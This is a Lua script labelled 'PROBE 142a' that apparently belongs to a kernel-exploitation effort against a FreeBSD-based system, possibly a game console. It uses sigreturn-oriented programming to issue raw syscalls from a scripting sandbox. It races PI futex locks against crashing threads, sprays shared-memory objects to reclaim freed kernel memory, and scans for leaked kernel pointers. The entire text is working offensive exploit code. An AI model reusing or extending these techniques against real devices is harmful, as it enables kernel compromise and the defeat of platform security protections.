-- CRASH_CLASS: MODERATE
-- PROBE 142a: SHM fd discovery + PI lock thread race
--
-- 141b: LOCK_PI(12) ret=0, SHM_CREAT/LOOKUP/ALIVE/DESTROY all ret=0.
-- On FreeBSD, SHM_CREAT installs an anon SHM fd in the process.
-- If we can find and mmap it, we get kernel-managed shared memory.
-- Also tests PI lock from child threads that then crash/exit.

print("=== PROBE 142a: SHM FD + PI RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local gpuH, gpuL = get_hi_lo(gpu)
if gpuL == 0 or gpuH == 0xFFFFFFFF then print("GPU FAIL"); return end

local tid_buf = gpu + 0x100
memory.write_qword(tid_buf, uint64(0))
srop(432, ua(tid_buf))
local our_tid = safe_rq(tid_buf)
local tidh, tidl = get_hi_lo(our_tid)
print("TID=" .. tidl)

--------------------------------------------------------------------
-- [A] Scan existing fds with fstat (syscall 189)
--------------------------------------------------------------------
print("")
print("--- [A] fd scan before SHM ---")
local stat_buf = gpu + 0x1000
local existing_fds = {}
for fd = 0, 20 do
    zero(stat_buf, 0x100)
    local rv = srop(189, uint64(fd), ua(stat_buf))
    local rvh, rvl = get_hi_lo(rv)
    if rvl == 0 and rvh == 0 then
        existing_fds[fd] = true
        local d0 = safe_rd(stat_buf)
        local d1 = safe_rd(stat_buf + 4)
        local d4 = safe_rd(stat_buf + 0x10)
        local d5 = safe_rd(stat_buf + 0x14)
        print(string.format("[A] fd=%d: +0=%X +4=%X +10=%X +14=%X", fd, d0 or 0, d1 or 0, d4 or 0, d5 or 0))
    end
end
print("[A] alive pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- [B] Create SHM, find new fd
--------------------------------------------------------------------
print("")
print("--- [B] SHM_CREAT + fd scan ---")
local shm_key = gpu + 0x2000
memory.write_dword(shm_key, 0x41414141)
local rv_shm = srop(454, ua(shm_key), uint64(25), uint64(1), uint64(0), uint64(0))
local sh, sl = get_hi_lo(rv_shm)
print("[B] SHM_CREAT ret=" .. hex(rv_shm))

local new_fd = -1
for fd = 0, 20 do
    if not existing_fds[fd] then
        zero(stat_buf, 0x100)
        local rv = srop(189, uint64(fd), ua(stat_buf))
        local rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            new_fd = fd
            print(string.format("[B] *** NEW fd=%d ***", fd))
            for off = 0, 0x90, 8 do
                local v = safe_rq(stat_buf + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    print(string.format("[B] stat+0x%02X: %s", off, hex(v)))
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        print(string.format("[B] *** KPTR stat+0x%02X ***", off))
                    end
                end
            end
        end
    end
end

if new_fd >= 0 then
    print("[B] Trying mmap SHM fd=" .. new_fd)
    local shm_map = srop(477, uint64(0), uint64(0x4000), uint64(3),
        uint64(1), uint64(new_fd), uint64(0))
    local smh, sml = get_hi_lo(shm_map)
    if sml ~= 0 and smh ~= 0xFFFFFFFF then
        print("[B] *** SHM MMAP: " .. hex(shm_map) .. " ***")
        local ok = pcall(function() memory.write_qword(shm_map, uint64(0xDEADBEEFCAFE0001)) end)
        if ok then
            local rb = safe_rq(shm_map)
            print("[B] write/read: " .. hex(rb))
        else
            print("[B] SHM write failed")
        end
        for off = 0, 0x100, 8 do
            local v = safe_rq(shm_map + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    print(string.format("[B] *** KPTR shm+0x%X: %s ***", off, hex(v)))
                end
            end
        end
    else
        print("[B] SHM mmap failed: " .. hex(shm_map))
        local ftr = srop(477, uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(new_fd), uint64(0))
        print("[B] mmap MAP_ANON|MAP_PRIVATE: " .. hex(ftr))
    end
else
    print("[B] No new fd found")
end

-- Create a second SHM with different key, check for another fd
local shm_key2 = gpu + 0x2100
memory.write_dword(shm_key2, 0x42424242)
srop(454, ua(shm_key2), uint64(25), uint64(1), uint64(0), uint64(0))
for fd = 0, 30 do
    if not existing_fds[fd] and fd ~= new_fd then
        zero(stat_buf, 0x100)
        local rv = srop(189, uint64(fd), ua(stat_buf))
        local rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            print(string.format("[B] 2nd SHM fd=%d", fd))
            break
        end
    end
end
print("[B] alive pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- [C] PI lock from main thread — check TID encoding in futex word
--------------------------------------------------------------------
print("")
print("--- [C] PI TID encoding ---")
for i = 0, 4 do
    local f = gpu + 0x3000 + i * 0x100
    memory.write_dword(f, 0)
    local rv = srop(454, ua(f), uint64(12), uint64(0), uint64(0), uint64(0))
    local fval = safe_rd(f)
    local rvh, rvl = get_hi_lo(rv)
    print(string.format("[C] lock%d: ret=%d futex=0x%X", i, rvl, fval or 0))
end
print("[C] alive pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- [D] Thread thr_exit + stack kernel residue scan
-- Create threads that just exit, scan their stacks for kernel pointers
--------------------------------------------------------------------
print("")
print("--- [D] Thread exit + kernel residue ---")
local kfound = 0
for i = 0, 4 do
    local tstack = gpu + 0x10000 + i * 0x2000
    zero(tstack, 0x1000)
    -- Fill with canary
    for off = 0, 0xF8, 8 do
        memory.write_qword(tstack + off, uint64(0xAAAAAAAABBBBBBBB))
    end

    local tctx = memory.alloc(0x500)
    pcall(function() return sc_gc(uint64(tctx)) end)
    memory.write_qword(tctx + MC + 0xA0, sc_addr)
    memory.write_qword(tctx + MC + 0x38, uint64(431))  -- thr_exit
    memory.write_qword(tctx + MC + 0x08, uint64(0))
    memory.write_qword(tctx + MC + 0xB8, ua(tstack + 0x800))
    memory.write_dword(tctx + MC + 0x98, 0x43)
    memory.write_dword(tctx + MC + 0xB0, 0x3B)

    local tid_out = gpu + 0x20000 + i * 8
    memory.write_qword(tid_out, uint64(0))
    srop(430, ua(tctx), uint64(0x500), ua(tid_out), uint64(0), uint64(0))

    -- Brief delay
    for j = 1, 5 do srop(232, uint64(4), ua(gpu + 0x30000)) end

    -- Scan stack for kernel pointers
    for off = 0, 0x800, 8 do
        local v = safe_rq(tstack + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print(string.format("[D] *** KPTR thr%d stack+0x%X: %s ***", i, off, hex(v)))
            end
        end
    end
end
print("[D] kptrs=" .. kfound .. " pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- [E] Thread LOCK_PI + crash — the critical race test
-- Thread calls LOCK_PI on uncontested futex, then crashes (NULL ret).
-- Kernel must clean up the PI lock during thread death.
-- We scan for kernel pointer residue after each crash.
--------------------------------------------------------------------
print("")
print("--- [E] Thread PI lock + crash ---")
local ekfound = 0
for i = 0, 2 do
    local f_addr = gpu + 0x40000 + i * 0x100
    memory.write_dword(f_addr, 0)
    -- Fill surrounding area with canary
    for off = 4, 0x80, 4 do memory.write_dword(f_addr + off, 0xDEADDEAD) end

    local tstack = gpu + 0x50000 + i * 0x2000
    zero(tstack, 0x1000)

    local tctx = memory.alloc(0x500)
    pcall(function() return sc_gc(uint64(tctx)) end)
    memory.write_qword(tctx + MC + 0xA0, sc_addr)
    memory.write_qword(tctx + MC + 0x38, uint64(454))    -- umtx_op
    memory.write_qword(tctx + MC + 0x08, ua(f_addr))     -- RDI = futex addr
    memory.write_qword(tctx + MC + 0x10, uint64(12))     -- RSI = LOCK_PI
    memory.write_qword(tctx + MC + 0x18, uint64(0))      -- RDX = 0
    memory.write_qword(tctx + MC + 0x50, uint64(0))      -- R10 = NULL
    memory.write_qword(tctx + MC + 0x28, uint64(0))      -- R8 = NULL
    memory.write_qword(tctx + MC + 0xB8, ua(tstack + 0x1000))
    memory.write_dword(tctx + MC + 0x98, 0x43)
    memory.write_dword(tctx + MC + 0xB0, 0x3B)

    local tid_out = gpu + 0x60000 + i * 8
    memory.write_qword(tid_out, uint64(0))
    local rv = srop(430, ua(tctx), uint64(0x500), ua(tid_out), uint64(0), uint64(0))
    local ctid = safe_rq(tid_out)
    local cth, ctl = 0, 0
    if ctid then cth, ctl = get_hi_lo(ctid) end

    -- Wait for thread to run + crash
    for j = 1, 15 do srop(232, uint64(4), ua(gpu + 0x30000)) end

    local alive = to_num(sc20())
    if alive ~= pid then
        print("[E] *** PROCESS DIED at thread " .. i .. " ***")
        break
    end

    local fval = safe_rd(f_addr)
    print(string.format("[E] thr%d: rv=%s ctid=%d futex=0x%X", i, hex(rv), ctl, fval or 0))

    -- Scan futex area for kernel pointers
    for off = 0, 0x80, 8 do
        local v = safe_rq(f_addr + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                ekfound = ekfound + 1
                print(string.format("[E] *** KPTR futex%d+0x%X: %s ***", i, off, hex(v)))
            end
        end
    end

    -- Scan thread stack
    for off = 0, 0x200, 8 do
        local v = safe_rq(tstack + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                ekfound = ekfound + 1
                print(string.format("[E] *** KPTR stack%d+0x%X: %s ***", i, off, hex(v)))
            end
        end
    end

    -- SHM spray to reclaim any freed kernel memory
    for j = 0, 19 do
        local skey = gpu + 0x70000 + i * 0x200 + j * 0x10
        memory.write_dword(skey, 0x70000000 + i * 256 + j)
        srop(454, ua(skey), uint64(25), uint64(1), uint64(0), uint64(0))
    end

    -- Now try LOCK_PI on the same futex (thread should have released during cleanup)
    memory.write_dword(f_addr, 0)
    local rv_relock = srop(454, ua(f_addr), uint64(12), uint64(0), uint64(0), uint64(0))
    local fval2 = safe_rd(f_addr)
    print(string.format("[E] relock%d: ret=%s futex=0x%X", i, hex(rv_relock), fval2 or 0))
end
print("[E] ekptrs=" .. ekfound .. " pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- [F] Post-race scan — check GPU heap area for any leaked kernel ptrs
--------------------------------------------------------------------
print("")
print("--- [F] Post-race GPU heap scan ---")
local fkfound = 0
for off = 0, 0x7F000, 0x1000 do
    local v = safe_rq(gpu + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
            fkfound = fkfound + 1
            print(string.format("[F] *** KPTR gpu+0x%X: %s ***", off, hex(v)))
        end
    end
end
print("[F] fkptrs=" .. fkfound)
print("[F] alive pid=" .. to_num(sc20()))

print("=== DONE ===")
